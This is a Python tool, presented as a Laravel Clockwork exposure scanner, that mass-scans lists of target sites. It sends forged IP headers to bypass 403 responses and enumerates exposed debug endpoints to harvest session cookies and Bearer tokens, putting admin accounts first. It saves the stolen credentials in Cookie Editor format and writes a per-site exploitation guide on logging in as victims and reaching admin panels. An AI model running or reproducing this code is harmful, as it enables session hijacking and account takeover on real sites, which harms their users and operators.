#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Laravel Clockwork Exposure Scanner
Checks if /__clockwork/ endpoints are exposed in production
Based on real vulnerability from Facebook post

DETECTION LOGIC:
1. Tests /__clockwork/app and /__clockwork/latest endpoints
2. Checks for Laravel debugging indicators in response
3. Looks for sensitive data (sessions, cookies, tokens)
4. Reports exposure level and exploitability

BOB RESEARCH LABS
Palo Alto | CrowdStrike | SentinelOne | Trend Micro | d1337.ai
"""

import os
import sys
import requests
import time
import urllib3
import json
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

# Configure UTF-8 encoding for Windows console
if sys.platform == 'win32':
    try:
        sys.stdout.reconfigure(encoding='utf-8')
        sys.stderr.reconfigure(encoding='utf-8')
    except:
        pass

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==================== COLORS ====================
R = "\033[91m"
G = "\033[92m"
Y = "\033[93m"
B = "\033[94m"
M = "\033[95m"
C = "\033[96m"
W = "\033[97m"
RST = "\033[0m"

BANNER = f"""{C}
 ██████╗██╗      ██████╗  ██████╗██╗  ██╗██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗
██╔════╝██║     ██╔═══██╗██╔════╝██║ ██╔╝██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝
██║     ██║     ██║   ██║██║     █████╔╝ ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ 
██║     ██║     ██║   ██║██║     ██╔═██╗ ██║███╗██║██║   ██║██╔══██╗██╔═██╗ 
╚██████╗███████╗╚██████╔╝╚██████╗██║  ██╗╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗
 ╚═════╝╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝ ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
{RST}                                                                                  
         {Y}Laravel Clockwork Scanner{RST} | {G}BOB RESEARCH LABS{RST}
"""

# ==================== CONFIG ====================
THREADS = 10
TIMEOUT = 8

# Output directory
OUTPUT_DIR = "Results"

# Thread-safe output
print_lock = Lock()

def safe_print(msg):
    """Thread-safe printing"""
    with print_lock:
        print(msg, flush=True)

# ==================== UTILITIES ====================
def ensure_output_dir():
    """Create output directory if not exists"""
    if not os.path.exists(OUTPUT_DIR):
        os.makedirs(OUTPUT_DIR)

def normalize_url(url):
    """Normalize URL to include http/https"""
    if not url.startswith(('http://', 'https://')):
        return f"https://{url}"
    return url

def get_hostname(url):
    """Extract hostname from URL"""
    from urllib.parse import urlparse
    parsed = urlparse(url)
    return parsed.netloc if parsed.netloc else url.replace('https://', '').replace('http://', '').split('/')[0]

def get_bypass_headers():
    """403 bypass headers from master.py"""
    return {
        'X-Forwarded-For': '127.0.0.1',
        'X-Originating-IP': '127.0.0.1',
        'X-Remote-IP': '127.0.0.1',
        'X-Remote-Addr': '127.0.0.1',
        'X-Client-IP': '127.0.0.1',
        'X-Host': '127.0.0.1',
        'X-Forwarded-Host': '127.0.0.1',
        'X-Real-IP': '127.0.0.1',
        'Forwarded': 'for=127.0.0.1;by=127.0.0.1;host=127.0.0.1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    }

def read_targets(file_path):
    """Read targets from file"""
    try:
        encodings = ['utf-8', 'latin-1', 'cp1252']
        for encoding in encodings:
            try:
                with open(file_path, 'r', encoding=encoding) as f:
                    targets = [normalize_url(line.strip()) for line in f if line.strip()]
                return targets
            except UnicodeDecodeError:
                continue
        return []
    except Exception as e:
        safe_print(f"{R}[ERROR]{RST} Reading file: {e}")
        return []

class ClockworkScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update(get_bypass_headers())
        
    def enumerate_previous_requests(self, target, request_id, count=500):
        """Enumerate previous requests to find authenticated sessions with cookies"""
        base_url = target.split('/__clockwork')[0]
        enum_url = f"{base_url}/__clockwork/{request_id}/previous/{count}"
        
        try:
            # Increase timeout for larger enumerations
            timeout = 30 if count > 1000 else 20
            response = self.session.get(enum_url, timeout=timeout, verify=False)
            if response.status_code == 200:
                data = json.loads(response.text)
                if isinstance(data, list):
                    return data
        except Exception as e:
            safe_print(f"{R}  [!]{RST} Enum error at {count}: {str(e)[:50]}")
        return []
    
    def find_best_session(self, previous_requests, stop_on_admin=True):
        """Find the best authenticated session from previous requests (prioritize ADMIN > USER > GUEST)"""
        admin_sessions = []
        user_sessions = []
        
        for req in previous_requests:
            if not isinstance(req, dict):
                continue
            
            # Check if authenticated
            auth_user = req.get('authenticatedUser')
            if auth_user is None:
                continue  # Skip guest sessions
            
            # Get cookies
            req_cookies = req.get('cookies', {})
            if not isinstance(req_cookies, dict) or not req_cookies:
                continue  # No cookies
            
            # Classify session type
            user_str = str(auth_user).lower()
            middleware = req.get('middleware', [])
            middleware_str = ' '.join(middleware).lower() if isinstance(middleware, list) else ''
            
            admin_indicators = ['admin', 'administrator', 'superadmin', 'super_admin', 'root', 'owner', 'manager', 'moderator']
            is_admin = any(indicator in user_str or indicator in middleware_str for indicator in admin_indicators)
            
            session_data = {
                'cookies': req_cookies,
                'auth_user': auth_user,
                'uri': req.get('uri', 'unknown'),
                'is_admin': is_admin
            }
            
            if is_admin:
                admin_sessions.append(session_data)
                if stop_on_admin:
                    # Found admin! Stop immediately
                    safe_print(f"{R}  [!]{RST} ADMIN session found! Stopping enumeration.")
                    return admin_sessions[0]
            else:
                user_sessions.append(session_data)
        
        # Return ADMIN first, then USER, never GUEST
        if admin_sessions:
            safe_print(f"{R}  [!]{RST} Found {len(admin_sessions)} ADMIN session(s) in previous requests!")
            return admin_sessions[0]  # Return first admin
        elif user_sessions:
            safe_print(f"{Y}  [!]{RST} Found {len(user_sessions)} USER session(s) in previous requests!")
            return user_sessions[0]  # Return first user
        
        return None
    
    def classify_session(self, response):
        """Classify session as ADMIN, USER, or GUEST based on authenticatedUser or JWT scopes"""
        try:
            data = json.loads(response.text)
            
            # Handle list responses (Clockwork can return arrays)
            if isinstance(data, list) and len(data) > 0:
                data = data[0]  # Get first item
            
            if isinstance(data, dict):
                auth_user = data.get('authenticatedUser')
                
                # Check for Bearer token in headers (for JWT authentication)
                has_bearer = False
                bearer_scopes = []
                headers = data.get('headers', {})
                if isinstance(headers, dict):
                    auth_header = headers.get('authorization', headers.get('Authorization', []))
                    if isinstance(auth_header, list) and len(auth_header) > 0:
                        if 'Bearer ' in auth_header[0]:
                            has_bearer = True
                            # Try to extract scopes from JWT
                            import base64
                            try:
                                token = auth_header[0].replace('Bearer ', '').strip()
                                if '.' in token:  # JWT format
                                    payload = token.split('.')[1]
                                    # Add padding if needed
                                    payload += '=' * (4 - len(payload) % 4)
                                    decoded = base64.b64decode(payload)
                                    jwt_data = json.loads(decoded)
                                    bearer_scopes = jwt_data.get('scopes', [])
                            except:
                                pass
                
                # If no authenticated user but has Bearer token with admin scopes
                if auth_user is None and has_bearer and bearer_scopes:
                    scopes_str = ' '.join(bearer_scopes).lower()
                    if 'admin' in scopes_str:
                        return 'ADMIN', {'id': 'JWT', 'name': 'JWT Token', 'email': 'via Bearer', 'role': scopes_str}
                    else:
                        return 'USER', {'id': 'JWT', 'name': 'JWT Token', 'email': 'via Bearer', 'role': scopes_str}
                
                if auth_user is None:
                    return 'GUEST', None
                
                # Check if authenticated user exists
                if isinstance(auth_user, dict):
                    # Check for admin indicators
                    admin_indicators = [
                        'admin', 'administrator', 'superadmin', 'super_admin',
                        'root', 'owner', 'manager', 'moderator'
                    ]
                    
                    # Convert to string for searching
                    user_str = str(auth_user).lower()
                    
                    # Check role/name/email for admin keywords
                    is_admin = any(indicator in user_str for indicator in admin_indicators)
                    
                    # Check middleware for admin
                    middleware = data.get('middleware', [])
                    if isinstance(middleware, list):
                        middleware_str = ' '.join(middleware).lower()
                        if 'admin' in middleware_str:
                            is_admin = True
                    
                    # Check scopes in JWT (Laravel Passport)
                    if bearer_scopes:
                        scopes_str = ' '.join(bearer_scopes).lower()
                        if 'admin' in scopes_str:
                            is_admin = True
                    
                    # Get user info
                    user_info = {
                        'id': auth_user.get('id', auth_user.get('user_id', 'unknown')),
                        'name': auth_user.get('name', auth_user.get('username', 'unknown')),
                        'email': auth_user.get('email', 'unknown'),
                        'role': auth_user.get('role', auth_user.get('role_id', 'unknown'))
                    }
                    
                    session_type = 'ADMIN' if is_admin else 'USER'
                    return session_type, user_info
        except:
            pass
        return 'UNKNOWN', None
    
    def extract_bearer_token(self, response):
        """Extract Bearer token from Authorization header in Clockwork response"""
        try:
            data = json.loads(response.text)
            
            # Handle list responses (Clockwork can return arrays)
            if isinstance(data, list) and len(data) > 0:
                data = data[0]  # Get first item
            
            if isinstance(data, dict) and 'headers' in data:
                headers = data.get('headers', {})
                if isinstance(headers, dict):
                    # Check for Authorization header (both lowercase and capitalized)
                    auth_header = headers.get('authorization', headers.get('Authorization', []))
                    if isinstance(auth_header, list) and len(auth_header) > 0:
                        auth_value = auth_header[0]
                        # Extract Bearer token (supports both Sanctum and JWT)
                        if auth_value and 'Bearer ' in auth_value:
                            token = auth_value.replace('Bearer ', '').strip()
                            # Return token regardless of format (Sanctum: 123|abc, JWT: eyJ...)
                            if token:
                                return token
        except:
            pass
        return None
    
    def extract_cookies_from_response(self, response, url):
        """Extract cookies from Clockwork response and format for Cookie Editor"""
        import json
        import re
        
        cookies = []
        bearer_token = None
        found_better_session = False  # Track if we found admin/user in enumeration
        
        try:
            # Only parse if it's valid JSON
            data = json.loads(response.text)
            
            # FIRST: Always try to extract bearer token (works for both dict and list)
            bearer_token = self.extract_bearer_token(response)
            if bearer_token:
                safe_print(f"{M}  [!]{RST} Found Bearer token for API authentication!")
            
            # Handle list responses
            if isinstance(data, list) and len(data) > 0:
                data = data[0]  # Use first item for cookie extraction
            
            # Clockwork stores cookies in specific structure
            if isinstance(data, dict):
                # NEW: Progressive enumeration until ADMIN found or max limit
                if 'id' in data:
                    request_id = data['id']
                    best_session = None
                    
                    # Try progressive depths: 500, 1000, 2000 (stop if ADMIN found)
                    for depth in [500, 1000, 2000]:
                        safe_print(f"{C}  [*]{RST} Enumerating {depth} previous requests (hunting admin sessions)...")
                        previous_requests = self.enumerate_previous_requests(url, request_id, depth)
                        
                        if previous_requests:
                            # Find best session (ADMIN > USER, skip GUEST)
                            best_session = self.find_best_session(previous_requests, stop_on_admin=True)
                            
                            # If we found ADMIN, stop here!
                            if best_session and best_session['is_admin']:
                                break  # Got admin, no need to go deeper
                            
                            # If we found USER but not ADMIN, try next depth
                            if best_session and not best_session['is_admin']:
                                if depth < 2000:
                                    safe_print(f"{Y}  [*]{RST} Only USER found, trying deeper enumeration...")
                                    continue  # Try next depth
                                else:
                                    break  # Max depth, use what we found
                            
                            # No authenticated sessions at all
                            if not best_session:
                                if depth < 2000:
                                    safe_print(f"{C}  [*]{RST} No auth sessions yet, going deeper...")
                                    continue
                                else:
                                    safe_print(f"{C}  [!]{RST} No authenticated sessions in {depth} requests (all guests)")
                                    break
                        else:
                            break  # Enumeration failed
                    
                    # Extract cookies from best session if found
                    if best_session:
                        req_cookies = best_session['cookies']
                        auth_user = best_session['auth_user']
                        
                        # Extract cookies from best session (PRIORITIZE THESE!)
                        for name, value in req_cookies.items():
                            if value and str(value).strip() and name not in ['x-clockwork']:
                                cookies.append({
                                    'name': name,
                                    'value': str(value),
                                    'domain': get_hostname(url),
                                    'path': '/',
                                    'secure': url.startswith('https'),
                                    'httpOnly': True
                                })
                        
                        found_better_session = True
                        session_label = f"{R}ADMIN{RST}" if best_session['is_admin'] else f"{Y}USER{RST}"
                        user_name = auth_user.get('name', auth_user.get('username', 'unknown'))
                        safe_print(f"{G}  [+]{RST} Extracted {session_label} cookies: {user_name}")
                
                # Only extract latest cookies if we didn't find better ones in enumeration
                if not found_better_session:
                    # Method 1: Direct cookies object (cookies sent IN the request)
                    if 'cookies' in data and isinstance(data['cookies'], dict):
                        for name, value in data['cookies'].items():
                            # Skip empty or None values
                            if value and str(value).strip():
                                cookies.append({
                                    'name': name,
                                    'value': str(value),
                                    'domain': get_hostname(url),
                                    'path': '/',
                                    'secure': url.startswith('https'),
                                    'httpOnly': True
                                })
                    
                    # Method 2: Request data -> cookies
                    if 'requestData' in data and isinstance(data['requestData'], dict):
                        req_cookies = data['requestData'].get('cookies', {})
                        if isinstance(req_cookies, dict):
                            for name, value in req_cookies.items():
                                if value and str(value).strip():
                                    cookies.append({
                                        'name': name,
                                        'value': str(value),
                                        'domain': get_hostname(url),
                                        'path': '/',
                                        'secure': url.startswith('https'),
                                        'httpOnly': True
                                    })
                    
                    # Method 3: Session data (Clockwork exposes this)
                    if 'sessionData' in data and isinstance(data['sessionData'], dict):
                        session_data = data['sessionData']
                        # Extract _token if present
                        if '_token' in session_data:
                            cookies.append({
                                'name': 'XSRF-TOKEN',
                                'value': str(session_data['_token']),
                                'domain': get_hostname(url),
                                'path': '/',
                                'secure': url.startswith('https'),
                                'httpOnly': False
                            })
        except:
            pass
        
        # Deduplicate cookies by name (keep first occurrence)
        seen_names = set()
        unique_cookies = []
        for cookie in cookies:
            if cookie['name'] not in seen_names:
                seen_names.add(cookie['name'])
                unique_cookies.append(cookie)
        
        return unique_cookies, bearer_token

    def check_clockwork_exposure(self, target):
        """Check if target has exposed Clockwork endpoints"""
        # Clockwork endpoints (from Facebook post)
        clockwork_paths = [
            '/__clockwork/app',
            '/__clockwork/latest',
            '/__clockwork/latest/100',
            '/__clockwork',
            '/clockwork'
        ]
        
        # Extract domain from URL
        from urllib.parse import urlparse
        parsed = urlparse(target)
        base_domain = parsed.netloc if parsed.netloc else target.replace('https://', '').replace('http://', '').split('/')[0]
        
        # Test subdomains
        test_domains = [
            target,
            f'https://www.{base_domain}',
            f'https://api.{base_domain}',
            f'https://app.{base_domain}',
            f'https://admin.{base_domain}'
        ]
        
        exposures = []
        
        for domain in test_domains:
            for path in clockwork_paths:
                try:
                    url = f"{domain}{path}"
                    response = self.session.get(url, timeout=TIMEOUT, verify=False)
                    
                    if response.status_code == 200:
                        content = response.text.strip()  # Remove leading/trailing whitespace
                        content_lower = content.lower()
                        
                        # STRICT Clockwork validation - must have JSON structure
                        is_valid_clockwork = False
                        
                        # Check 1: REJECT HTML FIRST (most common false positive)
                        if '<html' in content_lower or '<!doctype' in content_lower or content.startswith('<'):
                            continue  # Skip HTML responses immediately
                        
                        # Check 2: Must be valid JSON
                        try:
                            import json
                            data = json.loads(content)
                            
                            # Check 3: Must have Clockwork-specific structure
                            if isinstance(data, dict):
                                # Real Clockwork has these keys
                                clockwork_keys = ['id', 'version', 'type', 'method', 'uri', 'controller', 
                                                'headers', 'getData', 'requestData', 'cookies', 'sessionData']
                                found_keys = [k for k in clockwork_keys if k in data]
                                
                                # Must have at least 4 Clockwork keys to be valid
                                if len(found_keys) >= 4:
                                    is_valid_clockwork = True
                                    
                            elif isinstance(data, list) and len(data) > 0:
                                # Array of requests from /latest
                                if isinstance(data[0], dict):
                                    required_keys = ['id', 'uri', 'method', 'time']
                                    if all(key in data[0] for key in required_keys):
                                        is_valid_clockwork = True
                        except:
                            # Not valid JSON = Not Clockwork
                            continue
                        
                        if is_valid_clockwork:
                            safe_print(f"{G}[VULN]{RST} {url}")
                            safe_print(f"{G}  Status: {response.status_code} | Size: {len(content)} bytes{RST}")
                            
                            # Classify session type
                            session_type, user_info = self.classify_session(response)
                            
                            # Extract cookies and bearer token
                            cookies, bearer_token = self.extract_cookies_from_response(response, url)
                            
                            # Display session type with color
                            if session_type == 'ADMIN':
                                safe_print(f"{R}  [SESSION]{RST} {R}ADMIN{RST} - {user_info.get('name', 'unknown')} ({user_info.get('email', 'unknown')})")
                            elif session_type == 'USER':
                                safe_print(f"{Y}  [SESSION]{RST} {Y}USER{RST} - {user_info.get('name', 'unknown')} ({user_info.get('email', 'unknown')})")
                            elif session_type == 'GUEST':
                                safe_print(f"{C}  [SESSION]{RST} {C}GUEST{RST} - Not authenticated")
                            
                            # Check for sensitive data
                            sensitive_data = []
                            sensitive_patterns = [
                                ('password', 'Passwords'),
                                ('token', 'Tokens'),
                                ('session', 'Session data'),
                                ('cookie', 'Cookies'),
                                ('csrf', 'CSRF tokens'),
                                ('admin', 'Admin data'),
                                ('user_id', 'User IDs'),
                                ('email', 'Email addresses'),
                                ('api_key', 'API keys')
                            ]
                            
                            for pattern, description in sensitive_patterns:
                                if pattern in content.lower():
                                    sensitive_data.append(description)
                            
                            if sensitive_data:
                                safe_print(f"{R}  Sensitive: {', '.join(sensitive_data[:3])}...{RST}")
                            
                            if cookies:
                                safe_print(f"{M}  Cookies extracted: {len(cookies)}{RST}")
                            
                            # Test latest endpoint for more data
                            latest_url = None
                            request_ids = []
                            
                            if '/app' in path:
                                latest_url = url.replace('/app', '/latest')
                                try:
                                    latest_response = self.session.get(latest_url, timeout=5, verify=False)
                                    if latest_response.status_code == 200:
                                        safe_print(f"{Y}  Latest endpoint: {latest_url}{RST}")
                                        
                                        # Look for request IDs (from Facebook post)
                                        import json
                                        import re
                                        
                                        try:
                                            latest_data = json.loads(latest_response.text)
                                            if isinstance(latest_data, dict) and 'id' in latest_data:
                                                request_ids.append(latest_data['id'])
                                            elif isinstance(latest_data, list):
                                                for item in latest_data[:5]:
                                                    if isinstance(item, dict) and 'id' in item:
                                                        request_ids.append(item['id'])
                                        except:
                                            # Try regex fallback
                                            id_matches = re.findall(r'"id"\s*:\s*"([^"]+)"', latest_response.text)
                                            request_ids.extend(id_matches[:5])
                                        
                                        if request_ids:
                                            safe_print(f"{M}  Request IDs found: {len(request_ids)} (enumeration possible){RST}")
                                            
                                except:
                                    pass
                            
                            exposure = {
                                'url': url,
                                'domain': domain,
                                'path': path,
                                'status': response.status_code,
                                'size': len(content),
                                'sensitive_data': sensitive_data,
                                'exploitable': len(sensitive_data) > 0,
                                'session_type': session_type,
                                'user_info': user_info,
                                'cookies': cookies,
                                'bearer_token': bearer_token,
                                'latest_url': latest_url,
                                'request_ids': request_ids,
                                'response_text': content[:10000]  # Save first 10KB
                            }
                            exposures.append(exposure)
                        
                    time.sleep(0.1)  # Rate limiting
                    
                except Exception as e:
                    continue
        
        return exposures
    
    def save_site_results(self, hostname, exposures):
        """Save detailed results for a specific site"""
        import json
        
        ensure_output_dir()
        
        # Create hostname directory inside Results
        site_dir = os.path.join(OUTPUT_DIR, hostname)
        if not os.path.exists(site_dir):
            os.makedirs(site_dir)
        
        # Save exposed URLs with session classification
        urls_file = os.path.join(site_dir, "exposed_urls.txt")
        with open(urls_file, 'w', encoding='utf-8') as f:
            f.write(f"CLOCKWORK EXPOSURE FOUND - {hostname}\n")
            f.write("=" * 60 + "\n\n")
            
            for exp in exposures:
                # SESSION TYPE (highlighted)
                session_type = exp.get('session_type', 'UNKNOWN')
                user_info = exp.get('user_info')
                
                f.write(f"SESSION TYPE: {session_type}\n")
                if session_type == 'ADMIN' and user_info:
                    f.write(f"⚠️  ADMIN ACCESS FOUND! ⚠️\n")
                    f.write(f"User: {user_info.get('name', 'unknown')}\n")
                    f.write(f"Email: {user_info.get('email', 'unknown')}\n")
                    f.write(f"ID: {user_info.get('id', 'unknown')}\n")
                    f.write(f"Role: {user_info.get('role', 'unknown')}\n")
                elif session_type == 'USER' and user_info:
                    f.write(f"User: {user_info.get('name', 'unknown')}\n")
                    f.write(f"Email: {user_info.get('email', 'unknown')}\n")
                    f.write(f"ID: {user_info.get('id', 'unknown')}\n")
                elif session_type == 'GUEST':
                    f.write(f"Status: Not authenticated (guest session)\n")
                
                f.write(f"\nURL: {exp['url']}\n")
                f.write(f"Status: {exp['status']}\n")
                f.write(f"Size: {exp['size']} bytes\n")
                f.write(f"Sensitive Data: {', '.join(exp['sensitive_data']) if exp['sensitive_data'] else 'None'}\n")
                
                if exp.get('latest_url'):
                    f.write(f"Latest Endpoint: {exp['latest_url']}\n")
                
                if exp.get('request_ids'):
                    f.write(f"Request IDs: {', '.join(exp['request_ids'][:5])}\n")
                    f.write(f"\nEnumeration URLs:\n")
                    for req_id in exp['request_ids'][:3]:
                        f.write(f"  {exp['url'].replace('/__clockwork/app', '')}/__clockwork/{req_id}/previous/100\n")
                
                f.write("\n" + "-" * 60 + "\n\n")
        
        # Save Bearer tokens if found (SKIP GUEST)
        bearer_tokens = []
        for exp in exposures:
            session_type = exp.get('session_type', 'UNKNOWN')
            if exp.get('bearer_token') and session_type != 'GUEST':
                bearer_tokens.append({
                    'token': exp['bearer_token'],
                    'session_type': session_type,
                    'user_info': exp.get('user_info')
                })
        
        if bearer_tokens:
            bearer_file = os.path.join(site_dir, "bearer_tokens.txt")
            with open(bearer_file, 'w', encoding='utf-8') as f:
                f.write(f"BEARER TOKENS EXTRACTED FROM {hostname}\n")
                f.write("=" * 60 + "\n")
                f.write("API Authentication - Use these tokens in Authorization header\n")
                f.write("=" * 60 + "\n\n")
                f.write("HOW TO USE:\n")
                f.write("1. Install ModHeader extension (Chrome/Firefox)\n")
                f.write("2. Add request header:\n")
                f.write("   Name: Authorization\n")
                f.write("   Value: Bearer <token>\n")
                f.write("3. Visit the site - you'll be authenticated!\n\n")
                f.write("=" * 60 + "\n\n")
                
                for i, token_data in enumerate(bearer_tokens, 1):
                    session_type = token_data['session_type']
                    user_info = token_data['user_info']
                    token = token_data['token']
                    base_url = exposures[0]['url'].split('/__clockwork')[0]
                    
                    f.write(f"Token #{i} - SESSION: {session_type}\n")
                    
                    if session_type == 'ADMIN' and user_info:
                        f.write(f"⚠️  ADMIN TOKEN! ⚠️\n")
                        f.write(f"User: {user_info.get('name', 'unknown')}\n")
                        f.write(f"Email: {user_info.get('email', 'unknown')}\n")
                    elif session_type == 'USER' and user_info:
                        f.write(f"User: {user_info.get('name', 'unknown')}\n")
                        f.write(f"Email: {user_info.get('email', 'unknown')}\n")
                    elif session_type == 'GUEST':
                        f.write(f"Status: Guest/Unauthenticated\n")
                    
                    f.write(f"\nBearer {token}\n\n")
                    f.write(f"cURL Examples (Find real endpoints via Clockwork):\n")
                    f.write(f'curl "{base_url}/api/user" -H "Authorization: Bearer {token}"\n')
                    f.write(f'curl "{base_url}/api/admin/dashboard" -H "Authorization: Bearer {token}"\n')
                    f.write(f'(Check /__clockwork/latest -> uri field for actual API paths)\n\n')
                    f.write("-" * 60 + "\n\n")
        
        # Save cookies in Cookie Editor format (JSON) - SKIP GUEST
        all_cookies = []
        cookie_session_info = []
        for exp in exposures:
            session_type = exp.get('session_type', 'UNKNOWN')
            if exp.get('cookies') and session_type != 'GUEST':
                all_cookies.extend(exp['cookies'])
                # Store session info for this cookie set
                cookie_session_info.append({
                    'session_type': session_type,
                    'user_info': exp.get('user_info'),
                    'cookie_count': len(exp['cookies'])
                })
        
        if all_cookies:
            cookies_file = os.path.join(site_dir, "cookies_cookie-editor.json")
            with open(cookies_file, 'w', encoding='utf-8') as f:
                json.dump(all_cookies, f, indent=2)
            
            # Also save in readable format with session classification
            cookies_txt = os.path.join(site_dir, "cookies.txt")
            with open(cookies_txt, 'w', encoding='utf-8') as f:
                f.write(f"COOKIES EXTRACTED FROM {hostname}\n")
                f.write("=" * 60 + "\n")
                
                # Show session type summary
                for info in cookie_session_info:
                    session_type = info['session_type']
                    user_info = info['user_info']
                    
                    f.write(f"\nSESSION TYPE: {session_type}\n")
                    if session_type == 'ADMIN' and user_info:
                        f.write(f"⚠️  ADMIN SESSION COOKIES! ⚠️\n")
                        f.write(f"User: {user_info.get('name', 'unknown')}\n")
                        f.write(f"Email: {user_info.get('email', 'unknown')}\n")
                    elif session_type == 'USER' and user_info:
                        f.write(f"User: {user_info.get('name', 'unknown')}\n")
                        f.write(f"Email: {user_info.get('email', 'unknown')}\n")
                    elif session_type == 'GUEST':
                        f.write(f"Status: Guest/Unauthenticated (Won't log you in)\n")
                    f.write("\n")
                
                f.write("=" * 60 + "\n")
                f.write("Cookie Editor Format (JSON) - Copy from cookies_cookie-editor.json\n")
                f.write("=" * 60 + "\n\n")
                
                for cookie in all_cookies:
                    f.write(f"Name: {cookie['name']}\n")
                    f.write(f"Value: {cookie['value']}\n")
                    f.write(f"Domain: {cookie['domain']}\n")
                    f.write(f"Path: {cookie['path']}\n")
                    f.write(f"Secure: {cookie['secure']}\n")
                    f.write(f"HttpOnly: {cookie['httpOnly']}\n")
                    f.write("-" * 60 + "\n")
        
        # Save raw response samples
        for i, exp in enumerate(exposures):
            if exp.get('response_text'):
                response_file = os.path.join(site_dir, f"response_{i+1}.txt")
                with open(response_file, 'w', encoding='utf-8') as f:
                    f.write(f"Response from: {exp['url']}\n")
                    f.write("=" * 60 + "\n\n")
                    f.write(exp['response_text'])
        
        # Create exploitation guide
        exploit_file = os.path.join(site_dir, "EXPLOITATION_GUIDE.txt")
        with open(exploit_file, 'w', encoding='utf-8') as f:
            f.write(f"CLOCKWORK EXPLOITATION GUIDE - {hostname}\n")
            f.write("=" * 60 + "\n\n")
            
            f.write("EXPOSED ENDPOINTS:\n")
            for exp in exposures:
                f.write(f"  - {exp['url']}\n")
            f.write("\n")
            
            f.write("EXPLOITATION STEPS:\n")
            f.write("-" * 60 + "\n")
            f.write("1. Access /__clockwork/app endpoint to see realtime logs\n")
            f.write("2. Browse to /__clockwork/latest for recent requests\n")
            f.write("3. Extract session cookies and CSRF tokens\n")
            f.write("4. Use Cookie Editor extension to import cookies\n")
            f.write("5. Access admin panels with hijacked sessions\n\n")
            
            f.write("COOKIE INJECTION:\n")
            f.write("-" * 60 + "\n")
            f.write("1. Install Cookie Editor extension in browser\n")
            f.write("2. Open Cookie Editor\n")
            f.write("3. Click 'Import' button\n")
            f.write(f"4. Paste contents from: cookies_cookie-editor.json\n")
            f.write(f"5. Navigate to: {hostname}\n")
            f.write("6. You should be logged in as the user\n\n")
            
            if any(exp.get('request_ids') for exp in exposures):
                f.write("REQUEST ENUMERATION:\n")
                f.write("-" * 60 + "\n")
                for exp in exposures:
                    if exp.get('request_ids'):
                        f.write(f"Enumerate requests from: {exp['url']}\n")
                        for req_id in exp['request_ids'][:3]:
                            enum_url = exp['url'].replace('/__clockwork/app', '') + f"/__clockwork/{req_id}/previous/100"
                            f.write(f"  curl '{enum_url}'\n")
                        f.write("\n")
            
            f.write("\nHEADERS TO USE:\n")
            f.write("-" * 60 + "\n")
            f.write("X-Clockwork: (for debugging)\n")
            f.write("Set-Cookie: X-Clockwork (for publicwww searches)\n")
        
        safe_print(f"{G}[+]{RST} Results saved to: {site_dir}/")
        return site_dir

    def scan_target(self, target):
        """Scan single target for Clockwork exposure"""
        safe_print(f"\n{C}[*]{RST} Scanning {target}...")
        
        exposures = self.check_clockwork_exposure(target)
        
        # Save results per hostname
        if exposures:
            hostname = get_hostname(target)
            self.save_site_results(hostname, exposures)
        
        return exposures
    
    def scan_multiple_targets(self, targets):
        """Scan multiple targets with threading"""
        safe_print(f"\n{C}[*]{RST} Scanning {len(targets)} targets with {THREADS} threads...")
        safe_print(f"{C}[*]{RST} This may take a while...\n")
        
        all_exposures = {}  # hostname -> exposures
        completed = 0
        
        ensure_output_dir()
        summary_file = os.path.join(OUTPUT_DIR, "SUMMARY.txt")
        
        def scan_single(target):
            nonlocal completed
            exposures = self.check_clockwork_exposure(target)
            completed += 1
            
            if completed % 10 == 0:
                safe_print(f"{Y}[PROGRESS]{RST} {completed}/{len(targets)} scanned...")
            
            if exposures:
                hostname = get_hostname(target)
                # Save results immediately for this hostname
                self.save_site_results(hostname, exposures)
                return (hostname, exposures)
            return None
        
        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            futures = [executor.submit(scan_single, target) for target in targets]
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    hostname, exposures = result
                    all_exposures[hostname] = exposures
        
        # Create summary file
        if all_exposures:
            with open(summary_file, 'w', encoding='utf-8') as f:
                f.write("CLOCKWORK SCAN SUMMARY\n")
                f.write("=" * 60 + "\n")
                f.write(f"Total Targets Scanned: {len(targets)}\n")
                f.write(f"Vulnerable Hosts: {len(all_exposures)}\n")
                f.write(f"Total Exposures: {sum(len(exps) for exps in all_exposures.values())}\n")
                f.write("\n" + "=" * 60 + "\n\n")
                
                f.write("VULNERABLE HOSTS:\n")
                f.write("-" * 60 + "\n")
                for hostname, exposures in all_exposures.items():
                    f.write(f"\n{hostname}\n")
                    f.write(f"  Exposures: {len(exposures)}\n")
                    f.write(f"  Results: Results/{hostname}/\n")
                    f.write(f"  Cookies: Results/{hostname}/cookies_cookie-editor.json\n")
                    
                    for exp in exposures:
                        f.write(f"    - {exp['url']}\n")
                    
                    exploitable = [e for e in exposures if e.get('exploitable')]
                    if exploitable:
                        f.write(f"  ⚠️  {len(exploitable)} exposures with sensitive data\n")
        
        # Final summary
        safe_print(f"\n{G}[+]{RST} Scan complete!")
        safe_print(f"{G}[+]{RST} Vulnerable hosts: {len(all_exposures)}")
        safe_print(f"{G}[+]{RST} Total exposures: {sum(len(exps) for exps in all_exposures.values())}")
        
        if all_exposures:
            safe_print(f"\n{G}[VULNERABLE HOSTS]{RST}")
            for hostname in all_exposures.keys():
                safe_print(f"{G}  [+]{RST} {hostname} -> Results/{hostname}/")
            
            safe_print(f"\n{G}[+]{RST} Summary saved: {summary_file}")
            
            # Show exploitation info
            total_exploitable = sum(len([e for e in exps if e.get('exploitable')]) for exps in all_exposures.values())
            if total_exploitable > 0:
                safe_print(f"\n{R}[!]{RST} HIGH-VALUE TARGETS: {total_exploitable} exposures with sensitive data")
                safe_print(f"\n{Y}[EXPLOITATION GUIDE]{RST}")
                safe_print(f"{Y}  1.{RST} Go to Results/hostname/ folder")
                safe_print(f"{Y}  2.{RST} Open cookies_cookie-editor.json")
                safe_print(f"{Y}  3.{RST} Copy JSON content")
